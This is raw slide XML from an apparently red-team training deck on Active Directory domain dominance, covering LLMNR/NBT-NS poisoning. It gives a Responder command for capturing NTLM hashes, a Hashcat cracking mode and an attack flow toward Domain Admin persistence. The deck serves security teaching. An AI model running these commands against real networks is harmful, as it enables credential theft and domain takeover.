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6" r:id="rId1"/>
  </p:sldMasterIdLst>
  <p:notesMasterIdLst>
    <p:notesMasterId r:id="rId66"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="256" r:id="rId2"/>
    <p:sldId id="297" r:id="rId3"/>
    <p:sldId id="257" r:id="rId4"/>
    <p:sldId id="258" r:id="rId5"/>
    <p:sldId id="260" r:id="rId6"/>
    <p:sldId id="299" r:id="rId7"/>
    <p:sldId id="325" r:id="rId8"/>
    <p:sldId id="326" r:id="rId9"/>
    <p:sldId id="327" r:id="rId10"/>
    <p:sldId id="324" r:id="rId11"/>
    <p:sldId id="300" r:id="rId12"/>
    <p:sldId id="331" r:id="rId13"/>
    <p:sldId id="298" r:id="rId14"/>
    <p:sldId id="282" r:id="rId15"/>
    <p:sldId id="261" r:id="rId16"/>
    <p:sldId id="332" r:id="rId17"/>
    <p:sldId id="262" r:id="rId18"/>
    <p:sldId id="263" r:id="rId19"/>
    <p:sldId id="264" r:id="rId20"/>
    <p:sldId id="301" r:id="rId21"/>
    <p:sldId id="265" r:id="rId22"/>
    <p:sldId id="329" r:id="rId23"/>
    <p:sldId id="328" r:id="rId24"/>
    <p:sldId id="267" r:id="rId25"/>
    <p:sldId id="333" r:id="rId26"/>
    <p:sldId id="270" r:id="rId27"/>
    <p:sldId id="268" r:id="rId28"/>
    <p:sldId id="330" r:id="rId29"/>
    <p:sldId id="271" r:id="rId30"/>
    <p:sldId id="272" r:id="rId31"/>
    <p:sldId id="273" r:id="rId32"/>
    <p:sldId id="269" r:id="rId33"/>
    <p:sldId id="334" r:id="rId34"/>
    <p:sldId id="335" r:id="rId35"/>
    <p:sldId id="275" r:id="rId36"/>
    <p:sldId id="336" r:id="rId37"/>
    <p:sldId id="277" r:id="rId38"/>
    <p:sldId id="278" r:id="rId39"/>
    <p:sldId id="276" r:id="rId40"/>
    <p:sldId id="280" r:id="rId41"/>
    <p:sldId id="279" r:id="rId42"/>
    <p:sldId id="281" r:id="rId43"/>
    <p:sldId id="285" r:id="rId44"/>
    <p:sldId id="287" r:id="rId45"/>
    <p:sldId id="283" r:id="rId46"/>
    <p:sldId id="284" r:id="rId47"/>
    <p:sldId id="289" r:id="rId48"/>
    <p:sldId id="308" r:id="rId49"/>
    <p:sldId id="309" r:id="rId50"/>
    <p:sldId id="310" r:id="rId51"/>
    <p:sldId id="311" r:id="rId52"/>
    <p:sldId id="312" r:id="rId53"/>
    <p:sldId id="313" r:id="rId54"/>
    <p:sldId id="314" r:id="rId55"/>
    <p:sldId id="315" r:id="rId56"/>
    <p:sldId id="316" r:id="rId57"/>
    <p:sldId id="317" r:id="rId58"/>
    <p:sldId id="306" r:id="rId59"/>
    <p:sldId id="318" r:id="rId60"/>
    <p:sldId id="319" r:id="rId61"/>
    <p:sldId id="320" r:id="rId62"/>
    <p:sldId id="321" r:id="rId63"/>
    <p:sldId id="323" r:id="rId64"/>
    <p:sldId id="322" r:id="rId6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434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06" autoAdjust="0"/>
    <p:restoredTop sz="94660"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr>
        <p:scale>
          <a:sx n="75" d="100"/>
          <a:sy n="75" d="100"/>
        </p:scale>
        <p:origin x="552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00530A1-259E-479D-8FD3-E57EC13709F4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AE3BB98-7320-4989-807F-82D75B7A67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56968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E3BB98-7320-4989-807F-82D75B7A6788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993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E3BB98-7320-4989-807F-82D75B7A6788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60227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E3BB98-7320-4989-807F-82D75B7A6788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296967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E3BB98-7320-4989-807F-82D75B7A6788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183319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E3BB98-7320-4989-807F-82D75B7A6788}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0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22154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37590C-6CE5-48BF-A3B2-838E7A7C06F3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2C6876-24B3-43AE-BBFB-72930B5F73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27030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37590C-6CE5-48BF-A3B2-838E7A7C06F3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2C6876-24B3-43AE-BBFB-72930B5F73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63760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shade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shade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shade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37590C-6CE5-48BF-A3B2-838E7A7C06F3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2C6876-24B3-43AE-BBFB-72930B5F73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85763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37590C-6CE5-48BF-A3B2-838E7A7C06F3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2C6876-24B3-43AE-BBFB-72930B5F73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12123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37590C-6CE5-48BF-A3B2-838E7A7C06F3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2C6876-24B3-43AE-BBFB-72930B5F73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15662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37590C-6CE5-48BF-A3B2-838E7A7C06F3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2C6876-24B3-43AE-BBFB-72930B5F73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01689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37590C-6CE5-48BF-A3B2-838E7A7C06F3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2C6876-24B3-43AE-BBFB-72930B5F73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61192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37590C-6CE5-48BF-A3B2-838E7A7C06F3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2C6876-24B3-43AE-BBFB-72930B5F73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8101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37590C-6CE5-48BF-A3B2-838E7A7C06F3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2C6876-24B3-43AE-BBFB-72930B5F73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68950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37590C-6CE5-48BF-A3B2-838E7A7C06F3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2C6876-24B3-43AE-BBFB-72930B5F73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16100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37590C-6CE5-48BF-A3B2-838E7A7C06F3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2C6876-24B3-43AE-BBFB-72930B5F73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7788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pct5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6837590C-6CE5-48BF-A3B2-838E7A7C06F3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C62C6876-24B3-43AE-BBFB-72930B5F73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988363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07" r:id="rId1"/>
    <p:sldLayoutId id="2147483708" r:id="rId2"/>
    <p:sldLayoutId id="2147483709" r:id="rId3"/>
    <p:sldLayoutId id="2147483710" r:id="rId4"/>
    <p:sldLayoutId id="2147483711" r:id="rId5"/>
    <p:sldLayoutId id="2147483712" r:id="rId6"/>
    <p:sldLayoutId id="2147483713" r:id="rId7"/>
    <p:sldLayoutId id="2147483714" r:id="rId8"/>
    <p:sldLayoutId id="2147483715" r:id="rId9"/>
    <p:sldLayoutId id="2147483716" r:id="rId10"/>
    <p:sldLayoutId id="214748371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file:///\\fake-share" TargetMode="Externa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Week 8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Prepared by Umar </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Niaz</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Red Team Trainer at </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Cyberster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08596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2791732"/>
            <a:ext cx="11978640" cy="810306"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0"/>
              <a:t>Week 08 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="1" dirty="0"/>
              <a:t>AD Domain Dominance &amp; Advanced Persistence </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="40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1" dirty="0"/>
              <a:t>Objective</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: To move from a standard domain user to a Domain Administrator and establish high-level persistence that allows the Red Team to maintain control over the entire Windows Forest.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64193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</p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3800" b="1" dirty="0"/>
              <a:t>Task 01: LLMNR/NBT-NS Poisoning (The Initial Credential Theft) </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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325563"/>
            <a:ext cx="12192000" cy="589788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/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Description</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>: Intercept network traffic to steal password hashes from users who are trying to access non-existent network shares. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Technical Requirements</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Use Responder (responder -I eth0 -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>dwv</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>) to listen for LLMNR, NBT-NS, and MDNS requests. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Capture NTLMv1/v2 hashes from the network. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Cracking</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>: Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Hashcat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> (Mode 5600) to crack the captured NTLMv2 hashes. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Learning Goal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>: Understand how legacy protocols in Windows environments are a goldmine for attackers. </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10166350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9"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="0" y="32983"/>
            <a:ext cx="5899355" cy="7003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700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Task 01: LLMNR / NBT-NS Poisoning</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="18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700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>LLMNR / NBT-NS  are </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>fallback name resolution protocols</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> used inside local networks when DNS fails.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0">
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="18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700" dirty="0"/>
              <a:t>🔹 1. LLMNR (Link-Local Multicast Name Resolution)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" lvl="0" indent="-285750" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="18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1700" dirty="0"/>
              <a:t>Protocol used to resolve hostnames </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>when DNS fails</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" lvl="0" indent="-285750" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="18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1700" dirty="0"/>
              <a:t>Works over </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>multicast</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" lvl="0" indent="-285750" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="18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1700" dirty="0"/>
              <a:t>Uses </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>UDP port 5355</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="18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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>When a machine can’t resolve a hostname:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="18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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>“Who has FILESERVER???”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="18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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>It broadcasts to the local network.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="18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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Any machine can reply.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="18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700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>🔥 Example:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="18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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>User types:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
              <a:latin typeface="Arial Unicode MS"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="18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700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>\\fileservr (typo)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="18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700" dirty="0"/>
              <a:t>DNS fails → LLMNR kicks in → broadcast request sent</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
              <a:latin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78E09EC-B35E-BEB8-C363-CB68253A7C15}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6096000" y="611795"/>
            <a:ext cx="6164824" cy="47961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>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>💀 Attacker replies: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>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>“Yeah bro, I’m </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>fileservr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> 😈”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>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Victim connects → sends NTLM hash → attacker captures it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800" dirty="0"/>
              <a:t>🔹 2. NBT-NS (NetBIOS Name Service)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRP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800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Legacy Windows protocol (older than LLMNR) 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800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Used for hostname resolution on LAN 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800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Uses </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>UDP port 137</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> 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800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Same concept: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800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>“Who is WORKSTATION01???”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800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Broadcast → attacker spoofs reply</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="20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133236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-119625" y="38453"/>
            <a:ext cx="8231238" cy="54459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1700" dirty="0"/>
              <a:t>⚡ Key Difference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sz="1700" dirty="0"/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sz="1700" dirty="0"/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sz="1700" dirty="0"/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sz="1700" dirty="0"/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sz="1700" dirty="0"/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1700" dirty="0"/>
              <a:t>👉 But from an attacker perspective:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>💥 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>Both are equally exploitable</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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700" b="1" dirty="0"/>
              <a:t>🔥 Why these matter (REAL ATTACK VALUE)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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700" dirty="0"/>
              <a:t>These protocols are:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>✔ Enabled by default in many environments</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>✔ Automatically triggered by user mistakes</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>✔ Trust-based (no authentication)</a:t>
            </a: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1092680"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="-16386" y="449009"/>
          <a:ext cx="8127999" cy="184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82779">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2980523597"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2835887">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="908486281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1478907525"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="288401">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Feature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LLMNR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NBT-NS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290649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Protocol Age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Newer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Older (NetBIOS)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858708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Port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5355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137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703055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Usage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Modern fallback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Legacy systems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928644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Traffic Type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Multicast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Broadcast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88722761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82238281-8864-14F4-DC51-799E6B681E2C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5486401" y="2406286"/>
            <a:ext cx="6164824" cy="3791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1800" b="1" dirty="0"/>
              <a:t>💀 Attack Flow (LLMNR/NBT-NS Poisoning)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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800" dirty="0"/>
              <a:t>Victim tries accessing:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>\\wrongname</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>DNS fails </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>LLMNR/NBT-NS request sent </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Attacker machine responds (spoofing) </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Victim connects to attacker </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Victim sends </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>NTLM hash</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Attacker captures it</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33217058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-1" y="248915"/>
            <a:ext cx="5692877" cy="54514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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Description: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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Capture NTLM authentication hashes via network name resolution requests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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Attack Stage: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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Initial Credential Access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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Execution Context: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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>- Kali: Responder (listening)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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>- Windows: User-triggered request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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Key Point: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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Pre-exploitation network attack (not inside a compromised shell)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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Flow: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700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Victim request → Broadcast → Spoof response → NTLM auth → Hash captured</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
              <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Segoe UI Symbol" panose="020B050204020402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4BA4F02-5155-EF81-A9BB-778E36E4CD02}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
